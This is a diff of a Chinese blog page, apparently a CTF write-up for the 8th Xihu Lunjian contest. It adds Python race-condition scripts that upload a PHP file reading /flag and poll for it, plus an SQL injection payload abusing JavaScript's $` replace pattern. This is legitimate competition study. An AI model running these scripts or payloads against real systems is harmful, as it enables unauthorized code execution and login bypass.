@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">931字</span>
+        <span class="post-count">1.2k字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">4分</span>
+        <span class="post-count">6分</span>
       </span>
     </span>
     
@@ -287,6 +287,7 @@
     
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所以 已经没事了😄</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/145228235">https://blog.csdn.net/uuzeray/article/details/145228235</a></p>
 <span id="more"></span>
 
 <p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174518066.png" alt="image-20250118174518066"></p>
@@ -331,6 +332,54 @@ phone <span class="token operator">=</span> <span class="token string">''</span>
 <p>换了几个字典，最终爆出 year2000</p>
 <p>里面一个文件上传，啥都能传，但是访问 Uploads 里的文件路径只有 jpg 后缀的能读到，猜测其他后缀是被删了</p>
 <p>尝试条件竞争，py脚本+burp把我c盘缓存淦爆了都没竞争成功</p>
+<br>
+
+<p>存个条件竞争的脚本吧</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+ 
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    burp0_url <span class="token operator">=</span> <span class="token string">"http://139.155.126.78:30675/admin/index.php"</span>  <span class="token comment"># 更新 URL</span>
+    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"bsgq3v7goubrk1ciepr0se2dfc"</span><span class="token punctuation">&#125;</span>  <span class="token comment"># 更新 PHP 会话 ID</span>
+    
+    burp0_data <span class="token operator">=</span> <span class="token punctuation">(</span>
+        <span class="token string">"------WebKitFormBoundarygIbPTT5pJVbv72RS\r\n"</span>
+        <span class="token string">"Content-Disposition: form-data; name=\"file_upload\"; filename=\"yjh3.php\"\r\n"</span>
+        <span class="token string">"Content-Type: application/octet-stream\r\n\r\n"</span>
+        <span class="token string">"&lt;?php echo file_get_contents('/flag');?>\r\n"</span>  <span class="token comment"># 改为新代码</span>
+        <span class="token string">"------WebKitFormBoundarygIbPTT5pJVbv72RS--\r\n"</span>
+    <span class="token punctuation">)</span>
+    
+    <span class="token comment"># 发送 POST 请求，只保留 Cookie</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>
+    
+    <span class="token comment"># 提取文件名并保存到本地文件</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        filename <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'./Uploads/1f14bba00da3b75118bc8dbf8625f7d0/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/p>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'name.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 strip() 去除可能的换行符</span>
+    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无法提取文件路径或文件上传失败"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+ 
+url0 <span class="token operator">=</span> <span class="token string">'http://139.155.126.78:30675/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/'</span>
+ 
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token comment"># 直接读取文件内容，去除换行符并逐行处理</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'name.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+            shellpath <span class="token operator">=</span> url0 <span class="token operator">+</span> filename<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 strip() 去除换行符</span>
+ 
+            <span class="token comment"># 发起 GET 请求</span>
+            r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellpath<span class="token punctuation">)</span>
+ 
+            <span class="token comment"># 如果状态码不是 404，输出状态码和响应文本</span>
+            <span class="token keyword">if</span> r1<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">404</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>第一个脚本多开点才行</p>
+<p>合着就是线程少了竞争不来是吧</p>
 <hr>
 <h1 id="sqli-or-not（复现）"><a href="#sqli-or-not（复现）" class="headerlink" title="sqli or not（复现）"></a>sqli or not（复现）</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -412,23 +461,23 @@ sql <span class="token operator">=</span> sql<span class="token punctuation">.</
 RegExp<span class="token punctuation">[</span><span class="token string">'$`'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>测试：</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from t_user where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>
 sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>返回</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_user <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from t_user where username = '' and password = '</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_user <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from t_user where username = '' and password = '</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这样就拿到我们需要的<code>&#39;</code>了</p>
 <pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from t_user where username &#x3D; &#39;select * from t_user where username &#x3D; &#39;&#39; and password &#x3D; &#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from userinfo where username &#x3D; &#39;select * from userinfo where username &#x3D; &#39;&#39; and password &#x3D; &#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后构造注入得到payload：</p>
 <pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"or 1%23"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_user <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from t_user where username = '' and password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118165020071.png" alt="image-20250118165020071"></p>
 <p>然后就会下载到flag了（这里可以知道数据库不是sqlite，sqlite的注释符是<code>--</code>）</p>
